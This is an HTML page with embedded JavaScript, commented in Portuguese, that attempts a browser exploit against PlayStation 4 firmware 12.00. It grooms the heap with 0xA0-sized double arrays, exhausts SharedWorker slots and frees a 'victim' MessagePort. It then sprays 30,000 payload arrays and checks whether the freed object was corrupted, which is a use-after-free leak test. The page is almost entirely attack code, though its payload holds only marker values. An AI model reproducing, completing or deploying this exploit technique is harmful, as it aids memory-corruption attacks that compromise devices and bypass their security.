<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.00 TARGET 0xA0</title>
    
</head>
<body>

    <h1>PS4 12.00 - ALVO: 0xA0 (160 bytes)</h1>
    <h3>Estratégia: Butterfly Spray (Lapse Style)</h3>

    <button onclick="start_exploit()">INICIAR TESTE</button>

    <div id="log">Sistema pronto.</div>

    <script>
        // =================================================================
        // 1. CONFIGURAÇÕES REAIS
        // =================================================================
        // Foco total no 0xA0 que encontramos no binário
        const TARGET_SIZE = 0xA0; 
        
        // Limite de segurança (403)
        const WORKER_LIMIT = 403;
        
        // Spray massivo para garantir cobertura
        const SPRAY_QUANTITY = 30000;

        // =================================================================
        // 2. SISTEMA DE LOG
        // =================================================================
        function log(msg, type = "info") {
            var d = document.getElementById("log");
            var color = "#7d8590";
            if (type === "success") color = "#2ea043";
            if (type === "fail") color = "#f85149";
            if (type === "leak") color = "#d29922";

            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 3. GERENCIAMENTO DE MEMÓRIA (HEAP)
        // =================================================================
        var grooming_stash = [];

        function prepare_heap() {
            log(`HEAP: Preparando buracos de 0x${TARGET_SIZE.toString(16)} (Checkerboard)...`);
            grooming_stash = [];
            
            // Cálculo para Double Array (Butterfly):
            // Tamanho Total = Header (16) + (Elementos * 8)
            // Para 160 bytes (0xA0): (160 - 16) / 8 = 18 elementos
            const elementCount = 18; 
            
            let temp = [];
            // Aloca 3000 buffers
            for (let i = 0; i < 3000; i++) {
                let arr = new Array(elementCount);
                arr.fill(1.1); // Preenche com Doubles para garantir Butterfly
                temp.push(arr);
            }

            // Libera alternado (1 sim, 1 não) para criar o padrão de queijo suíço
            // O Worker 403 deve cair num desses buracos
            let holes = 0;
            for (let i = 0; i < temp.length; i += 2) {
                temp[i] = null; // Libera para o GC
                holes++;
            }
            
            // Mantém os vizinhos vivos
            grooming_stash = temp.filter(x => x !== null);
            log(`HEAP: ${holes} buracos preparados.`, "success");
        }

        // =================================================================
        // 4. PAYLOAD (DOUBLE ARRAY)
        // =================================================================
        function build_payload() {
            const elementCount = 18; // (160 - 16) / 8
            const arr = new Array(elementCount);
            
            // Valor Marcador: 1.1 (0x3FF199999999999A)
            // Se o kernel ler isso como ponteiro, aponta para Userland (seguro).
            // Se o JS ler isso de volta num objeto corrompido, saberemos.
            for(let i=0; i<arr.length; i++) {
                arr[i] = 1.1; 
            }
            
            return arr;
        }

        // =================================================================
        // 5. EXECUÇÃO (TRIGGER)
        // =================================================================
        var workers_stash = [];
        var is_running = false;

        async function start_exploit() {
            if (is_running) return;
            if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
            
            is_running = true;
            log(`>>> INICIANDO (Alvo: 0x${TARGET_SIZE.toString(16)}) <<<`, "leak");

            // 1. Preparar Memória
            prepare_heap();
            
            // 2. Payload
            const payload = build_payload();

            // 3. Grooming (Base)
            workers_stash = [];
            log("Grooming Workers (380)...");
            for(let i=0; i<380; i++) {
                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 4. Trigger Loop
            let p_count = 0;
            const limit = WORKER_LIMIT - 380;

            var interval = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(interval);
                    
                    // O ÚLTIMO (403) - A VÍTIMA
                    const victim = workers_stash.pop();
                    
                    attempt_leak(victim, payload);
                    
                    is_running = false;
                    return;
                }

                try {
                    let w = new SharedWorker("data:text,1", "v_"+p_count);
                    w.port.start();
                    workers_stash.push(w);
                    
                    if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
                } catch(e) {}
                
                p_count++;
            }, 60); // Rápido o suficiente para não perder o slot
        }

        function attempt_leak(victim, payload) {
            log("!!! DISPARANDO SWAP (0xA0) !!!", "leak");
            
            const port = victim.port;
            
            // 1. FREE
            victim.port.close();
            
            // 2. SPRAY (Imediato)
            // Usamos slice() para clonar o array rapidamente e inundar o heap
            const spray = [];
            for (let k = 0; k < SPRAY_QUANTITY; k++) {
                spray.push(payload.slice(0));
            }

            // 3. VERIFICAÇÃO
            setTimeout(() => {
                try {
                    const s = port.toString();
                    
                    // Se o objeto foi sobrescrito, ele não deve ser mais [object MessagePort]
                    if (s.indexOf("MessagePort") === -1) {
                        log("!!! SUCESSO ABSOLUTO !!!", "leak");
                        log("Objeto Corrompido: " + s, "leak");
                        alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
                    } else {
                        log("Falha: Objeto intacto [object MessagePort].");
                        
                        // Teste de estresse: tentar acessar propriedade
                        // Se o vtable estiver sujo com 1.1, isso deve causar um crash controlado ou erro
                        try { let temp = port.onmessage; } catch(e) {
                            if(e.toString().match(/0x/)) {
                                log("LEAK NO ERRO: " + e, "leak");
                                alert("LEAK NO ERRO!");
                            }
                        }
                    }
                } catch (e) {
                    // Erros aqui são Ouro
                    log("ERRO CAPTURADO: " + e, "leak");
                    alert("ERRO CAPTURADO (LEAK): " + e);
                }
                
                // Limpeza
                workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
            }, 500);
        }
    </script>
</body>
</html>
